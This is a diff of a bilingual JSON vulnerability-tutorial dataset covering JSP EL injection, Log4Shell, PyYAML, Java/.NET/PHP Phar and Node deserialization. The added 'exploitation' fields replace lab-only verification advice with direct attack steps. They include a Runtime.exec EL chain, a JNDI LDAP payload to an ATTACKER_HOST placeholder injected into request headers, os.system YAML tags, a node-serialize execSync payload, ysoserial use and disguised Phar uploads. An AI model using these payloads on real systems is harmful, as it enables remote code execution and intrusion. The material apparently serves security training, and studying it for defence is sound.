+          "en": "JSP Expression Language injection targets untrusted data executed as expressions by the JSP EL evaluator, where pageContext, ELResolver, and reflection can reach objects beyond display needs. It validates the getClass().forName chain through Runtime execution."
         },
         "vulnerability": {
-          "zh": "应用将用户字段拼入表达式源码，或对已经渲染过的字符串执行第二次 EL 求值，同时使用暴露 pageContext、Bean、静态类型或方法解析能力的上下文。输入因而不再是页面数据，而可导航服务器对象并调用方法；实际能力由 EL 版本、容器配置和自定义 Resolver 决定。",
-          "en": "The application concatenates user fields into expression source or evaluates an already rendered string a second time while exposing pageContext, beans, static types, or method resolution. Input becomes capable of navigating server objects and invoking methods. Actual reach depends on the EL version, container configuration, and custom resolvers."
+          "zh": "应用将用户字段拼入表达式源码，或对已经渲染过的字符串执行第二次 EL 求值，同时使用暴露 pageContext、Bean、静态类型或方法解析能力的上下文；输入因此不再是页面数据，而可导航服务器对象并调用方法。",
+          "en": "The application splices user fields into expression source or performs second-pass EL evaluation on already-rendered strings, with contexts exposing pageContext, beans, static types, or method resolution; input stops being page data and can navigate server objects and invoke methods."
         },
         "exploitation": {
-          "zh": "先比较普通字符串与常量表达式的服务端输出，确认不是客户端计算；随后在可回滚容器中提交原始集合并观察 EL 异常、类解析和子进程审计；最后关闭 JavaScript、清理缓存并把同一表达式发送到纯文本端点，排除浏览器执行、预渲染缓存和日志替换造成的假阳性。",
-          "en": "Compare plain text with a constant expression in the server response to rule out client computation. Submit the original corpus to a disposable container and observe EL exceptions, class resolution, and child-process audit events. Disable JavaScript, clear caches, and send the same expression to a plain-text endpoint to exclude browser execution, prerendered cache, and log substitution as false positives."
+          "zh": "按第 1 步逐条提交 ${\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")} 等反射链变体；命中判据为 EL 求值执行命令并返回对应输出。exec 直接输出不回显时改用重定向或外带取回；先以常量计算（如 ${7*7}）确认 EL 求值入口，再逐级测试对象访问与方法调用，区分前端模板与 JSP EL 两种处理者。",
+          "en": "Submit ${\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")} and similar reflection-chain variants one by one per step 1; a hit is EL evaluation executing the command with corresponding output. When exec output is not echoed, use redirection or out-of-band retrieval; first confirm the EL evaluation entry with constant computation (e.g., ${7*7}), then test object access and method invocation stage by stage, distinguishing front-end templates from JSP EL."
         },
         "mitigation": {
-          "zh": "禁止把外部值拼成 EL 源码或进行二次求值，只把它们作为已编码的数据模型属性；使用固定 JSP 表达式并限制自定义 ELResolver 暴露的 Bean 和方法；升级 Servlet/EL 实现，启用最低权限与出站限制，并审计异常表达式解析和反射访问。",
-          "en": "Never concatenate external values into EL source or evaluate them twice; expose them only as encoded model data. Use fixed JSP expressions and restrict beans and methods available through custom ELResolvers. Upgrade servlet and EL implementations, enforce least privilege and egress controls, and audit unusual expression parsing and reflection access."
+          "zh": "禁止把外部值拼成 EL 源码或进行二次求值，只把它们作为已编码的数据模型属性；使用固定 JSP 表达式并限制自定义 ELResolver 暴露的 Bean 和方法；升级 Servlet/EL 实现，启用最低权限与出站限制，并审计异常表达式解析和反射访问。修复后重放第 1 步链，确认被拒绝。",
+          "en": "Never splice external values into EL source or perform second-pass evaluation—keep them as encoded data-model attributes; use fixed JSP expressions and limit beans and methods exposed by custom ELResolvers; upgrade Servlet/EL implementations, enable least privilege and egress restrictions, and audit anomalous expression parsing and reflective access. After the fix, replay the step-1 chain and confirm rejection."
         },
         "difficulty": "advanced"
       },
@@ -912,20 +912,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Log4Shell 的有效性取决于 Log4j 版本、消息 Lookup 行为、JNDI 组件、Java 运行时和网络出口。看到 `${jndi:...}` 出现在日志或响应中并不能证明触发；本条要求使用自有的无害 DNS/LDAP 观察端点，将唯一请求标识与应用日志、解析请求和出站流量逐一关联。",
-          "en": "Log4Shell exploitability depends on the Log4j version, message Lookup behavior, JNDI components, Java runtime, and network egress. Seeing `${jndi:...}` in a log or response does not prove a lookup. Use an owned harmless DNS or LDAP observer and correlate a unique request identifier with application logs, resolution requests, and outbound traffic."
+          "zh": "Log4j JNDI Lookup 注入针对不可信日志字段进入受影响 Log4j Lookup 解析路径的场景：可触发 JNDI 名称解析或出站连接。验证 ${jndi:ldap://} 四种端口形式对自有观察端的回连。",
+          "en": "Log4j JNDI lookup injection targets untrusted log fields entering affected Log4j lookup resolution, able to trigger JNDI name resolution or outbound connections. It validates ${jndi:ldap://} in four port forms calling back to your own observer."
         },
         "vulnerability": {
-          "zh": "受影响的 Log4j 2 版本会在记录消息或参数时解析 Lookup 表达式，JNDI Lookup 可根据输入访问 LDAP、RMI 或其他名称服务。在缺少版本修复、组件移除和出站限制时，攻击者控制的日志字段可能从字符串处理扩展为远程资源解析，并在特定运行时形成代码执行链。",
-          "en": "Affected Log4j 2 releases evaluate Lookup expressions while formatting messages or parameters. JNDI Lookup can access LDAP, RMI, or other naming services based on input. Without patched versions, component removal, and egress restrictions, attacker-controlled log fields can progress from string processing to remote resource resolution and, on applicable runtimes, code execution."
+          "zh": "受影响的 Log4j 2 版本会在记录消息或参数时解析 Lookup 表达式，JNDI Lookup 可根据输入访问 LDAP、RMI 或其他名称服务；缺少版本修复、组件移除和出站限制时，攻击者控制的日志字段可扩展为远程资源解析并形成代码执行链。",
+          "en": "Affected Log4j 2 versions resolve lookup expressions when logging messages or parameters, and the JNDI lookup can reach LDAP, RMI, or other naming services per input; without version fixes, component removal, and egress restrictions, attacker-controlled log fields extend into remote resource resolution and code-execution chains."
         },
         "exploitation": {
-          "zh": "步骤一从 SBOM、依赖树和运行时类路径确认实际加载的 Log4j 版本；步骤二在隔离网络用原始语料中的单一变体和唯一令牌发起请求，观察自有 DNS/LDAP 回连、应用请求 ID 与网络日志；步骤三以普通文本、已修补实例和仅由扫描器发起的 DNS 查询作对照，排除安全设备探测、日志回显或独立 DNS 流量造成的假阳性。",
-          "en": "First confirm the loaded Log4j version from the SBOM, dependency tree, and runtime classpath. In an isolated network, send one original variant with a unique token and observe callbacks to an owned DNS or LDAP service alongside request IDs and network logs. Compare plain text, a patched instance, and scanner-generated DNS traffic to exclude security-device probes, log reflection, or unrelated resolution as false positives."
+          "zh": "先在攻击者侧部署无害 DNS/LDAP 观察端并生成唯一请求标识，再按第 1 步把 ${jndi:ldap://{ATTACKER_HOST}/a} 及 1389/389/636 端口变体注入常见日志字段（User-Agent、X-Api-Version 等）；命中判据为攻击者 LDAP 服务收到目标解析回连或带外记录出现。把唯一标识与应用日志、解析请求和出站流量逐一关联；看到 ${jndi:...} 被记录不等于触发。",
+          "en": "Deploy a harmless DNS/LDAP observer attacker-side with unique request identifiers first, then inject ${jndi:ldap://{ATTACKER_HOST}/a} and the 1389/389/636 port variants into common log fields (User-Agent, X-Api-Version, etc.) per step 1; a hit is the target's resolution callback at your LDAP service or outbound records appearing. Correlate the unique identifier with application logs, resolution requests, and outbound traffic; ${jndi:...} merely being logged is not a trigger."
         },
         "mitigation": {
-          "zh": "升级到 Apache 公告确认的受支持 Log4j 版本并清除应用包中的旧副本；移除不需要的 JNDI Lookup 能力，确保构建与运行时依赖一致；在网络层阻断应用到非授权 LDAP/RMI/DNS 目标的出口，集中记录依赖版本、Lookup 异常和异常解析请求。",
-          "en": "Upgrade to an Apache-supported Log4j release and remove old copies from application packages. Remove unneeded JNDI Lookup capability and verify build-time and runtime dependencies match. Block application egress to unauthorized LDAP, RMI, and DNS destinations, and centralize dependency, Lookup-error, and anomalous-resolution telemetry."
+          "zh": "升级到 Apache 公告认可的 Log4j 版本并清除旧副本；移除不需要的 JNDI Lookup 能力，网络层阻断到非授权 LDAP/RMI/DNS 的出口，集中记录 Lookup 异常与异常解析请求。修复后重放第 1 步注入，确认无回连。",
+          "en": "Upgrade to Log4j versions endorsed by the Apache advisory and purge old copies; remove unneeded JNDI lookup capability, block egress to unauthorized LDAP/RMI/DNS at the network layer, and centrally record lookup anomalies and anomalous resolution requests. After the fix, replay the step-1 injections and confirm zero callbacks."
         },
         "difficulty": "expert"
       },
@@ -1021,20 +1021,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "YAML 标准描述数据结构，但具体库可能扩展 `!!python/object` 等语言标签。测试需要确认应用采用的解析函数和 Loader 类型，并区分安全标量解析、未知标签报错以及真正的 Python 对象构造；仅看到标签被保存、转发或打印不能证明反序列化执行。",
-          "en": "YAML describes data structures, but implementations may add language tags such as `!!python/object`. Testing must identify the parser function and Loader type and separate safe scalar parsing, unknown-tag errors, and actual Python object construction. A tag being stored, forwarded, or printed does not prove execution."
+          "zh": "YAML 不安全对象构造针对 YAML 解析器允许外部文档通过语言特定标签实例化对象的场景：!!python/object/apply 标签可从配置数据跨越到命令执行。验证 apply 与 new 两类标签在目标 Loader 下的行为。",
+          "en": "Unsafe YAML object construction targets YAML parsers letting external documents instantiate objects via language-specific tags: !!python/object/apply can cross from configuration data into command execution. It validates apply and new tag classes under the target loader."
         },
         "vulnerability": {
-          "zh": "PyYAML 等库的全功能 Loader 会根据显式标签选择 Python 构造器，对象 apply/new 标签可把文档节点映射为函数参数或类实例。若上传配置、CI 文件或 API 请求未经信任校验便交给不安全 Loader，解析阶段即可调用 os、subprocess 等当前进程可见对象。",
-          "en": "Full-featured loaders in libraries such as PyYAML select Python constructors from explicit tags. Object apply and new tags can map document nodes to function arguments or class instances. If uploaded configuration, CI files, or API requests reach an unsafe Loader without a trust check, parsing can invoke visible objects such as os or subprocess."
+          "zh": "PyYAML 等库的全功能 Loader 会按显式标签选择 Python 构造器，apply/new 标签可把文档节点映射为函数调用；不可信 YAML 交给不安全 Loader 时，解析阶段即可执行 os、subprocess 等进程可见对象。",
+          "en": "Full-featured loaders in libraries like PyYAML pick Python constructors per explicit tags, and apply/new tags can map document nodes into function calls; when untrusted YAML reaches unsafe loaders, parsing itself executes os, subprocess, and other process-visible objects."
         },
         "exploitation": {
-          "zh": "先用只含字符串、列表和映射的 YAML 记录返回对象类型；再在无网络、只读文件系统的测试容器提交一个原始标签样本，观察构造器调用、解析异常与子进程事件；最后使用 safe_load、未知自定义标签和仅回显原文的端点复测，排除文本匹配、另一个配置处理器或测试夹具副作用造成的假阳性。",
-          "en": "Start with YAML containing only strings, lists, and mappings and record returned types. In a network-isolated, read-only container, submit one original tagged sample and observe constructor calls, parser errors, and child-process events. Retest with safe_load, an unknown custom tag, and an endpoint that only reflects text to exclude string matching, another configuration processor, or fixture side effects as false positives."
+          "zh": "按第 1 步逐条提交 !!python/object/apply:os.system ['pwd'] 与 subprocess.check_output 变体到目标 YAML 解析入口；命中判据为 yaml.load 按标签执行函数并返回命令输出。先以安全标量文档确认解析入口，再提交标签文档；未命中时核对应用使用的 Loader 类型（SafeLoader 拒绝标签为预期行为），区分未知标签报错与真正对象构造。",
+          "en": "Submit !!python/object/apply:os.system ['pwd'] and subprocess.check_output variants one by one to the target YAML parsing entry per step 1; a hit is yaml.load executing the function per the tag and returning command output. First confirm the parsing entry with a safe scalar document, then submit tag documents; on a miss, check the application's loader type (SafeLoader rejecting tags is expected), distinguishing unknown-tag errors from genuine object construction."
         },
         "mitigation": {
-          "zh": "对不可信 YAML 使用 safe_load 或等价安全 Loader，并显式允许业务需要的基础类型；删除通用对象构造标签和自定义危险 Constructor，升级解析库；将配置导入放在低权限、禁网、只读环境中，限制文档大小和别名深度并记录未知标签。",
-          "en": "Use safe_load or an equivalent safe Loader for untrusted YAML and explicitly allow only required primitive types. Remove generic object tags and dangerous custom constructors and update the parser library. Process configuration imports with low privilege, no network, and a read-only filesystem, enforce size and alias-depth limits, and log unknown tags."
+          "zh": "对不可信 YAML 使用 safe_load 或安全 Loader，并显式允许业务需要的基础类型；删除通用对象构造标签和自定义危险 Constructor，升级解析库；将配置导入放在低权限、禁网、只读环境中，限制文档大小和别名深度并记录未知标签。修复后重放第 1 步文档，确认标签被拒绝。",
+          "en": "Use safe_load or a safe loader for untrusted YAML, explicitly allowing only business-needed base types; remove generic object-construction tags and custom dangerous Constructors, and upgrade parsing libraries; run config imports in low-privilege, no-network, read-only environments with document-size and alias-depth limits and unknown-tag logging. After the fix, replay the step-1 documents and confirm tags are rejected."
         },
         "difficulty": "advanced"
       },
@@ -1130,20 +1130,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Java 原生序列化流通常以魔数开头并携带类描述符，但发现序列化字节并不等于存在可利用 Gadget。本条要求确认 ObjectInputStream 调用、运行时类路径、ObjectInputFilter 决策和实际回调，并以无害对象、被过滤对象及原始字节集合形成对照。",
-          "en": "Java serialization streams usually carry a magic header and class descriptors, but finding serialized bytes does not prove an exploitable gadget. This review confirms the ObjectInputStream call, runtime classpath, ObjectInputFilter decisions, and actual callbacks using benign objects, filtered objects, and the original byte corpus as controls."
+          "zh": "Java 原生反序列化与 Commons Collections Gadget 针对外部序列化流进入 ObjectInputStream 的场景：类路径中的 Gadget 在 readObject 阶段触发非预期方法链。验证十六进制序列化流的目标接受与行为差异。",
+          "en": "Java native deserialization with Commons Collections gadgets targets external streams entering ObjectInputStream, where classpath gadgets trigger unexpected method chains during readObject. It validates target acceptance and behavioral differences of hex-encoded serialization streams."
         },
         "vulnerability": {
-          "zh": "ObjectInputStream 会根据流中的类信息恢复对象并调用 readObject、readResolve 等生命周期方法。应用若接受不可信流，且类路径包含可组合的反射、转换器或集合 Gadget，副作用可能在业务类型检查之前执行。依赖是否存在、版本是否可用和过滤器配置共同决定实际风险。",
-          "en": "ObjectInputStream restores classes named in the stream and invokes lifecycle methods such as readObject and readResolve. If untrusted streams are accepted while the classpath contains composable reflection, transformer, or collection gadgets, side effects may occur before business type checks. Dependency presence, usable versions, and filter configuration determine actual risk."
+          "zh": "ObjectInputStream 会根据流中的类信息恢复对象并调用 readObject、readResolve 等生命周期方法；应用若接受不可信流且类路径包含可组合的反射、转换器或集合 Gadget，副作用可能在业务类型检查之前执行。",
+          "en": "ObjectInputStream restores objects from in-stream class descriptors and invokes lifecycle methods like readObject and readResolve; if the application accepts untrusted streams while the classpath holds composable reflection, transformer, or collection gadgets, side effects can execute before business type checks."
         },
         "exploitation": {
-          "zh": "步骤一用应用版本生成的简单 DTO 序列化流记录成功与失败类型；步骤二在只读隔离 JVM 提交原始十六进制语料，观察 resolveClass、ObjectInputFilter、异常栈和受控回调证据；步骤三移除 Commons Collections、启用拒绝过滤器并把同一字节发送到仅存储接口，排除魔数识别、传输解码和不可达 Gadget 造成的假阳性。",
-          "en": "First serialize a simple DTO with the application version and record accepted and rejected types. In a read-only isolated JVM, submit the original hexadecimal corpus and observe resolveClass, ObjectInputFilter decisions, stack traces, and a controlled callback. Remove Commons Collections, enable a reject filter, and send the same bytes to a storage-only endpoint to exclude magic-header detection, transport decoding, and unreachable gadgets as false positives."
+          "zh": "按第 1 步把十六进制序列化流（aced0005 开头）逐条提交到目标反序列化点；命中判据为反序列化后行为与基线出现差异（异常、延迟或命令副作用）。先确认入口接受序列化字节并记录响应差异，再区分魔数识别、类恢复、gadget 触发与最终副作用四个阶段；建议先用 ysoserial 生成的标记命令载荷对照，确认哪条链在当前类路径可用。",
+          "en": "Per step 1, submit the hex-encoded serialization streams (aced0005-prefixed) to the target deserialization point one by one; a hit is post-deserialization behavior diverging from the baseline (exceptions, delays, or command side effects). First confirm the entry accepts serialized bytes and record response differences, then keep the four stages distinct—magic recognition, class restoration, gadget triggering, and final side effects; compare against ysoserial-generated marker-command payloads to identify which chain works on the current classpath."
         },
         "mitigation": {
-          "zh": "跨信任边界停止使用 Java 原生序列化并迁移到显式数据协议；在迁移期配置进程级和流级 ObjectInputFilter，只允许最小业务类型、深度、引用数和字节数；移除不需要的 Gadget 依赖并持续升级，隔离反序列化进程且监控拒绝事件和异常类加载。",
-          "en": "Stop using native Java serialization across trust boundaries and migrate to an explicit data protocol. During migration, configure process-wide and stream-specific ObjectInputFilters with minimal allowed business types, depth, references, and bytes. Remove unnecessary gadget dependencies, keep them updated, isolate deserialization, and monitor filter rejections and unusual class loading."
+          "zh": "跨信任边界停止使用 Java 原生序列化并迁移到显式数据协议；迁移期配置进程级与流级 ObjectInputFilter，只允许最小业务类型、深度、引用数和字节数；移除不需要的 Gadget 依赖并升级，隔离反序列化进程且监控拒绝事件和异常类加载。修复后重放第 1 步流，确认被过滤器拒绝。",
+          "en": "Stop native Java serialization across trust boundaries and migrate to explicit data protocols; during migration configure process-level and stream-level ObjectInputFilters allowing only minimal business types, depth, references, and byte counts; remove unneeded gadget dependencies, keep upgrading, isolate deserialization, and monitor rejections and anomalous class loading. After the fix, replay the step-1 streams and confirm filter rejection."
         },
         "difficulty": "expert"
       },
@@ -1243,20 +1243,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "BinaryFormatter 在流中携带完整类型信息并按运行时类图恢复对象，微软已明确将其视为无法安全用于不可信输入的危险 API。本条审校需要确认实际格式、调用栈和类型绑定器，区分 Base64 包装、普通二进制传输与真正的 BinaryFormatter.Deserialize 调用。",
-          "en": "BinaryFormatter carries full type information and restores runtime object graphs. Microsoft classifies it as unsafe for untrusted input. This review identifies the actual format, call stack, and binder and separates Base64 wrapping or ordinary binary transport from a real BinaryFormatter.Deserialize call."
+          "zh": ".NET BinaryFormatter 不安全反序列化针对外部可控对象流进入 BinaryFormatter 的场景：类型实例化阶段可触发可利用 Gadget。验证 Base64 包装的序列化流在目标反序列化器的类型解析行为。",
+          "en": "Unsafe .NET BinaryFormatter deserialization targets externally controllable object streams entering BinaryFormatter, where type instantiation can trigger exploitable gadgets. It validates type-resolution behavior of Base64-wrapped streams at the target deserializer."
         },
         "vulnerability": {
-          "zh": "BinaryFormatter 在业务验证前创建流中声明的对象并运行序列化回调，常见框架类型可组合为具有副作用的 Gadget。自定义 SerializationBinder 或类型黑名单无法覆盖继承、代理和新依赖带来的所有图形，因此只要攻击者能够修改对象流，反序列化本身就构成高风险执行边界。",
-          "en": "BinaryFormatter creates stream-declared objects and invokes serialization callbacks before business validation. Framework types can compose into side-effecting gadgets. A custom SerializationBinder or type blacklist cannot cover inheritance, proxies, and newly introduced dependencies, so attacker-modifiable streams make deserialization itself a high-risk execution boundary."
+          "zh": "BinaryFormatter 在业务验证前创建流中声明的对象并运行序列化回调，常见框架类型可组合为具有副作用的 Gadget；自定义 SerializationBinder 或类型黑名单无法覆盖所有图形，只要攻击者能修改对象流，反序列化本身就构成高风险执行边界。",
+          "en": "BinaryFormatter creates in-stream declared objects and runs serialization callbacks before business validation, and common framework types compose into side-effecting gadgets; custom SerializationBinders or type blacklists cannot cover all graphs—whenever attackers can modify the object stream, deserialization itself is a high-risk execution boundary."
         },
         "exploitation": {
-          "zh": "先用当前应用生成的简单数据契约记录正常头部、类型和异常；再在禁网、低权限测试进程提交原始 Base64 集合，关联类型绑定、反序列化异常与受控进程证据；最后把同一字节交给仅 Base64 解码接口和已移除 BinaryFormatter 的构建，排除包装层成功、统一错误页或不可达代码造成的假阳性。",
-          "en": "Generate a simple data contract with the current application and record normal headers, types, and exceptions. Submit the original Base64 corpus to a low-privilege, network-isolated test process and correlate type binding, deserialization errors, and controlled process evidence. Send the same bytes to a Base64-only endpoint and a build without BinaryFormatter to exclude wrapper success, generic errors, or unreachable code as false positives."
+          "zh": "按第 1 步把 Base64 包装的 BinaryFormatter 流逐条提交到目标反序列化入口；命中判据为 BinaryFormatter 反序列化触发类型解析行为差异（异常类型变化、延迟或副作用）。先确认入口接受二进制/Base64 数据并记录响应差异，再区分 Base64 解码、格式识别、类型绑定与对象实例化阶段；建议以无害标记对象对照，确认 binder 或黑名单是否实际生效。",
+          "en": "Per step 1, submit the Base64-wrapped BinaryFormatter streams to the target deserialization entry one by one; a hit is type-resolution behavior changes during BinaryFormatter deserialization (exception-type shifts, delays, or side effects). First confirm the entry accepts binary/Base64 data and record response differences, then keep the stages distinct—Base64 decode, format recognition, type binding, and object instantiation; compare against harmless marker objects to check whether a binder or blacklist actually takes effect."
         },
         "mitigation": {
-          "zh": "删除 BinaryFormatter、NetDataContractSerializer 等危险格式并迁移到带显式契约的 System.Text.Json 或 protobuf；不要依赖 Binder 作为安全边界；在迁移完成前隔离旧读取器、限制文件和网络权限、认证消息来源，并监控危险反序列化 API 与异常类型加载。",
-          "en": "Remove BinaryFormatter, NetDataContractSerializer, and similar dangerous formats and migrate to System.Text.Json or protobuf with explicit contracts. Do not rely on a Binder as a security boundary. Until migration is complete, isolate legacy readers, restrict filesystem and network access, authenticate message origins, and monitor dangerous deserialization APIs and unusual type loading."
+          "zh": "删除 BinaryFormatter 等危险格式并迁移到显式契约的 JSON/protobuf；迁移期隔离旧读取器、认证消息来源并限制文件与网络权限，监控危险反序列化 API。修复后重放第 1 步流，确认被拒绝且无异常类型加载。",
+          "en": "Remove BinaryFormatter-style dangerous formats and migrate to explicit-contract JSON/protobuf; during migration isolate legacy readers, authenticate message origins, restrict file and network permissions, and monitor dangerous deserialization APIs. After the fix, replay the step-1 streams and confirm rejection with no anomalous type loading."
         },
         "difficulty": "expert"
       },
@@ -1352,20 +1352,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Phar 风险不是看到 phar:// 字符串即可确认，而要同时满足可控归档、可达文件函数、适用 PHP 版本行为和可用对象 Gadget。本条命令主要覆盖伪装扩展名下的 Phar 路径，应结合真实归档、流包装器调用和魔术方法日志，区分路径接受与元数据反序列化。",
-          "en": "A phar:// string alone does not prove a vulnerability. Confirmation requires a controllable archive, a reachable file function, applicable PHP behavior, and a usable object gadget. The corpus covers Phar paths hidden behind varied extensions and must be correlated with a real archive, stream-wrapper calls, and magic-method logs to separate path acceptance from metadata deserialization."
+          "zh": "PHP Phar 元数据反序列化针对用户可控路径进入 phar:// 流包装器的场景：文件操作过程中可解析归档元数据并触发应用类魔术方法。验证伪装扩展名的 phar:// 路径能否触发元数据处理行为。",
+          "en": "PHP Phar metadata deserialization targets user-controlled paths entering the phar:// stream wrapper, where file operations can parse archive metadata and trigger application-class magic methods. It validates whether disguised-extension phar:// paths trigger metadata handling."
         },
         "vulnerability": {
-          "zh": "应用把外部路径传给文件存在性、图像处理或归档函数，PHP 可能按 phar:// 方案打开攻击者控制的归档。历史版本和特定调用会处理序列化元数据；若类路径包含具有 __wakeup、__destruct 等副作用的对象链，文件操作可在业务校验前演变为对象注入。",
-          "en": "The application passes external paths to existence checks, image processing, or archive functions, and PHP may open an attacker-controlled archive through phar://. Historical versions and applicable calls process serialized metadata. If loaded classes contain side-effecting __wakeup or __destruct chains, a file operation can become object injection before business validation."
+          "zh": "应用把外部路径传给文件存在性、图像处理或归档函数，PHP 可能按 phar:// 方案打开攻击者控制的归档；历史版本和特定调用会处理序列化元数据，若类路径包含具有 __wakeup、__destruct 等副作用的对象链，文件操作可在业务校验前演变为对象注入。",
+          "en": "Applications passing external paths to file-existence, image, or archive functions let PHP open attacker-controlled archives via the phar:// scheme; older versions and certain calls process serialized metadata, and when the classpath holds object chains with side-effecting __wakeup/__destruct, file operations escalate into object injection before business validation."
         },
         "exploitation": {
-          "zh": "步骤一用普通本地文件和不存在文件记录函数行为；步骤二在一次性环境准备带无害标记元数据的 Phar，并使用原始路径集合触发目标文件函数，观察包装器、元数据对象和魔术方法日志；步骤三对比无 Phar 魔数的同名文件、当前 PHP 版本和仅做字符串校验的接口，排除扩展名接受、404 差异或旧版本假设导致的假阳性。",
-          "en": "Record target-function behavior with a normal local file and a missing file. In a disposable environment, prepare a Phar carrying harmless marker metadata and trigger the file function with the original path corpus, observing wrapper, metadata-object, and magic-method logs. Compare a same-named file without a Phar signature, the current PHP version, and a string-validation-only endpoint to exclude extension acceptance, 404 differences, or outdated assumptions as false positives."
+          "zh": "先上传带序列化元数据的受控 Phar（伪装 shell.css/shell.svg 等扩展名），再按第 1 步把 phar:// 路径提交到 file_exists、getimagesize 等文件函数；命中判据为解析 phar:// 时触发元数据处理行为（标记副作用或异常栈）。逐条记录触发函数与 PHP 版本；可控归档、可达函数、适用版本与可用 gadget 四者齐备才成立。",
+          "en": "Upload a controlled Phar with serialized metadata disguised as shell.css/shell.svg extensions first, then submit phar:// paths to file functions like file_exists and getimagesize per step 1; a hit is metadata handling when phar:// is parsed (marker side effects or exception stacks). Record the triggering function and PHP version per path; all four—controllable archive, reachable function, applicable version, available gadget—must hold."
         },
         "mitigation": {
-          "zh": "拒绝外部输入中的非业务 URI 方案并在规范化后校验真实路径；不要对不可信归档调用 unserialize 或依赖自动元数据对象恢复，升级 PHP 和相关文件处理库；将上传文件放在不可执行、不可作为 Phar 打开的隔离存储，移除危险魔术方法链并限制进程权限。",
-          "en": "Reject non-business URI schemes in external input and validate canonical paths. Never unserialize untrusted archive metadata or depend on automatic object restoration, and update PHP and file-processing libraries. Store uploads in isolated, non-executable storage that cannot be opened as Phar, remove dangerous magic-method chains, and restrict process privileges."
+          "zh": "拒绝外部输入中的非业务 URI 方案并规范化后校验真实路径；不对不可信归档调用 unserialize 或依赖自动元数据恢复，升级 PHP 和相关文件处理库；将上传文件放在不可执行、不可按 Phar 打开的隔离存储，移除危险魔术方法链并限制进程权限。修复后重放第 1 步路径，确认被拒绝。",
+          "en": "Reject non-business URI schemes in external input and verify real paths after normalization; never unserialize untrusted archives or rely on automatic metadata restoration, and upgrade PHP and file-processing libraries; keep uploads in isolated, non-executable storage that cannot be opened as Phar, remove dangerous magic-method chains, and limit process permissions. After the fix, replay the step-1 paths and confirm rejection."
         },
         "difficulty": "advanced"
       },
@@ -1461,20 +1461,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Node.js 自带 JSON.parse 不会执行函数，本条针对会识别 `_$$ND_FUNC$$_` 等私有标记并通过 eval 或 Function 构造器还原函数的第三方库。审校必须先确认实际依赖和调用点，再用进程、模块加载与日志证据证明函数体被执行，不能因字符串中出现 child_process 就下结论。",
-          "en": "Native JSON.parse does not execute functions. This entry targets third-party libraries that recognize private markers such as `_$$ND_FUNC$$_` and rebuild functions through eval or the Function constructor. Confirm the dependency and call site, then prove execution through process, module-loading, and log evidence rather than inferring it from a child_process string."
+          "zh": "Node.js 不安全函数反序列化针对第三方序列化组件把带函数标记的外部 JSON 重新构造为函数并立即执行的场景：_$$ND_FUNC$$_ 前缀经 eval/Function 还原代码。验证函数标记 JSON 的还原执行行为。",
+          "en": "Unsafe Node.js function deserialization targets third-party serialization components rebuilding function-marked external JSON into functions and executing them immediately: the _$$ND_FUNC$$_ prefix restores code via eval/Function. It validates restoration and execution of function-marked JSON."
         },
         "vulnerability": {
-          "zh": "危险序列化库为了恢复函数对象，将字符串内容交给动态 JavaScript 求值，并可能在反序列化时调用立即执行函数。外部请求、Cookie、消息或缓存只要能控制该字符串，就可在模式校验之前访问 require、process 和应用闭包中的能力；标准 JSON 类型约束在动态求值之后已无法阻止副作用。",
-          "en": "Dangerous serialization libraries restore function objects by passing string content to dynamic JavaScript evaluation and may invoke an immediately executed function during deserialization. If requests, cookies, messages, or caches control that string, it can reach require, process, and application capabilities before schema validation. Standard JSON type checks occur too late to prevent side effects."
+          "zh": "危险序列化库为了恢复函数对象，将字符串内容交给动态 JavaScript 求值，并可能在反序列化时调用立即执行函数；外部请求、Cookie、消息或缓存只要能控制该字符串，就可在模式校验之前访问 require、process 和应用闭包中的能力。",
+          "en": "Dangerous serialization libraries hand string content to dynamic JavaScript evaluation to restore function objects, possibly invoking immediately-executed functions during deserialization; whenever external requests, cookies, messages, or caches control that string, require, process, and closure capabilities are reachable before schema validation."
         },
         "exploitation": {
-          "zh": "先把相同对象交给 JSON.parse 并记录它仍为普通字符串；再在禁网测试进程调用实际反序列化函数，提交一个原始样本并关联 require、child_process 和异常日志；最后使用已移除目标依赖的构建、转义函数标记和只存储不解析的路径作对照，排除关键字检测、测试桩或后续业务代码执行造成的假阳性。",
-          "en": "Pass the same object through JSON.parse and confirm the marker remains a string. In a network-isolated test process, call the actual deserializer with one original sample and correlate require, child_process, and exception logs. Compare a build without the dependency, an escaped function marker, and a storage-only path to exclude keyword detection, test stubs, or later business logic as false positives."
+          "zh": "按第 1 步逐条提交含 _$$ND_FUNC$$_ 前缀与 child_process.execSync('id') 的 JSON 到目标反序列化入口；命中判据为反序列化立即执行内嵌函数并返回命令输出。先确认依赖是否为支持函数恢复的库（如旧版 node-serialize）及其调用点，再投递；字符串中出现 child_process 不构成证据，需以实际执行输出与模块加载日志佐证。",
+          "en": "Per step 1, submit JSON containing the _$$ND_FUNC$$_ prefix with child_process.execSync('id') to the target deserialization entry one by one; a hit is the embedded function executing immediately on deserialization and returning command output. First confirm whether the dependency is a function-restoring library (e.g., legacy node-serialize) and its call sites, then deliver; child_process appearing in a string is not evidence—corroborate with actual execution output and module-load logs."
         },
         "mitigation": {
-          "zh": "删除支持函数恢复或动态求值的不安全序列化包，仅接受标准 JSON 基础类型并执行严格 Schema 校验；禁止 eval、new Function 和 vm 执行外部文本；固定依赖版本并持续扫描废弃包，在最低权限、禁网环境处理历史消息，同时审计异常模块加载和子进程创建。",
-          "en": "Remove serialization packages that restore functions or dynamically evaluate text. Accept only standard JSON primitive types under a strict schema. Prohibit eval, new Function, and vm execution of external text. Pin and scan dependencies, process legacy messages with least privilege and no network, and audit unusual module loading and child-process creation."
+          "zh": "删除支持函数恢复的不安全序列化包，仅接受标准 JSON 类型并严格校验 Schema；禁止 eval、new Function 和 vm 执行外部文本，固定依赖版本并审计异常模块加载与子进程创建。修复后重放第 1 步 JSON，确认被拒绝。",
+          "en": "Remove unsafe serialization packages supporting function restoration, accepting only standard JSON types with strict schema validation; forbid eval, new Function, and vm on external text, pin dependency versions, and audit anomalous module loads and child processes. After the fix, replay the step-1 JSON and confirm rejection."
         },
         "difficulty": "advanced"
       },
@@ -1570,20 +1570,20 @@
       },
       "tutorial": {
         "overview": {
